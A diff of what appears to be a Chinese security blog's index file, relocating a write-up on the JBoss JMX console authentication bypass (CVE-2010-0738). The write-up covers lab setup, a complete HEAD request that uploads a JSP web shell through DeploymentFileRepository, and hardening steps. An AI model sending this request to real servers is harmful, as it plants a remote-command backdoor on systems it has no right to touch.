@@ -4794,7 +4794,7 @@
 <tr>
 <td align="center">mailto</td>
 <td align="center">邮件协议</td>
-<td align="center">url=mailto:<a href="mailto:&#x78;&#x78;&#x78;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#x78;&#x78;&#x78;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a>?cc=xxx&amp;body=hello</td>
+<td align="center">url=mailto:<a href="mailto:&#x78;&#120;&#x78;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109;">&#x78;&#120;&#x78;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109;</a>?cc=xxx&amp;body=hello</td>
 </tr>
 <tr>
 <td align="center">netdoc</td>
@@ -5874,6 +5874,84 @@
       </tags>
   </entry>
   <entry>
+    <title>JBoss JMX控制台安全验证绕过漏洞 - CVE-2010-0738</title>
+    <url>//3a334b8ad7cb.html</url>
+    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<p>默认端口：8080</p>
+<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        JXM控制台配置仅指定了对于<code>GET</code>和<code>POST</code>请求的限制，入侵者可以通过<code>HEAD</code>等方式提交特制的HTTP请求以绕过身份验证并访问受限信息</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
+<ul>
+<li>JBoss 4.2.x</li>
+<li>JBoss 4.3.x</li>
+</ul>
+<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 8以下</p>
+<p>在官网下载相应的JBoss版本</p>
+<p>配置环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>
+
+<p>外网访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>启动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
+<ol>
+<li>JBoss漏洞检测工具下载</li>
+</ol>
+<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
+<ol start="2">
+<li>先探测是否具有JBoss服务</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>
+
+<p>根据HTTP头部</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>访问如下URL</strong></p>
+<p>当设置了登录验证，以下地址限制<code>GET</code>和<code>POST</code>方式访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</span><br></pre></td></tr></table></figure>
+
+<p>这里我们通过其他的HTTP方法使用<code>jboss.admin -&gt; DeploymentFileRepository -&gt; store()</code>方法</p>
+<p>通过抓包将<code>POST</code>方法改成<code>HEAD</code>，并将传参移动到URL处</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HEAD /jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodIndex=0&amp;arg0=shell2.war&amp;arg1=shell&amp;arg2=.jsp&amp;arg3=%3C%25eval%20request%28%22admin%22%29%25%3E&amp;arg4=True HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br></pre></td></tr></table></figure>
+
+<p>以上代码的URL处不要轻易修改，比如空格，回车，会导致格式错误</p>
+<p><code>arg3</code>的内容为<code>&lt;%eval request(&quot;admin&quot;)%&gt;</code>通过<code>Escape</code>加密之后得到的值</p>
+<p>直接传参会导致报错，上传失败</p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
+<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在上述代码中禁止所有方法访问，而不是仅为<code>GET</code>和<code>POST</code></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>升级JBoss版本</li>
+<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>Web服务器漏洞</category>
+        <category>JBoss</category>
+      </categories>
+      <tags>
+        <tag>访问控制错误漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>JBoss JMXInvokerServlet 反序列化漏洞 - CVE-2015-7501</title>
     <url>//7ce29cf4d767.html</url>
     <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
@@ -5951,84 +6029,6 @@
       </categories>
       <tags>
         <tag>反序列化漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JBoss JMX控制台安全验证绕过漏洞 - CVE-2010-0738</title>
-    <url>//3a334b8ad7cb.html</url>
-    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
-<p>默认端口：8080</p>
-<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
-<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        JXM控制台配置仅指定了对于<code>GET</code>和<code>POST</code>请求的限制，入侵者可以通过<code>HEAD</code>等方式提交特制的HTTP请求以绕过身份验证并访问受限信息</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
-<ul>
-<li>JBoss 4.2.x</li>
-<li>JBoss 4.3.x</li>
-</ul>
-<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 8以下</p>
-<p>在官网下载相应的JBoss版本</p>
-<p>配置环境变量</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>
-
-<p>外网访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>
-
-<p>启动</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
-<ol>
-<li>JBoss漏洞检测工具下载</li>
-</ol>
-<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
-<ol start="2">
-<li>先探测是否具有JBoss服务</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>
-
-<p>根据HTTP头部</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>访问如下URL</strong></p>
-<p>当设置了登录验证，以下地址限制<code>GET</code>和<code>POST</code>方式访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</span><br></pre></td></tr></table></figure>
-
-<p>这里我们通过其他的HTTP方法使用<code>jboss.admin -&gt; DeploymentFileRepository -&gt; store()</code>方法</p>
-<p>通过抓包将<code>POST</code>方法改成<code>HEAD</code>，并将传参移动到URL处</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HEAD /jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodIndex=0&amp;arg0=shell2.war&amp;arg1=shell&amp;arg2=.jsp&amp;arg3=%3C%25eval%20request%28%22admin%22%29%25%3E&amp;arg4=True HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br></pre></td></tr></table></figure>
-
-<p>以上代码的URL处不要轻易修改，比如空格，回车，会导致格式错误</p>
-<p><code>arg3</code>的内容为<code>&lt;%eval request(&quot;admin&quot;)%&gt;</code>通过<code>Escape</code>加密之后得到的值</p>
-<p>直接传参会导致报错，上传失败</p>
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
-<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
-</ol>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在上述代码中禁止所有方法访问，而不是仅为<code>GET</code>和<code>POST</code></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>升级JBoss版本</li>
-<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>Web服务器漏洞</category>
-        <category>JBoss</category>
-      </categories>
-      <tags>
-        <tag>访问控制错误漏洞</tag>
       </tags>
   </entry>
   <entry>
